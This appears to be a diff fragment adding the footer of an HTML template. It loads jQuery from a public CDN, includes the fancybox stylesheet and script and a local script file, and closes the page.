+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+
+
+  </div>
+</body>
+</html>
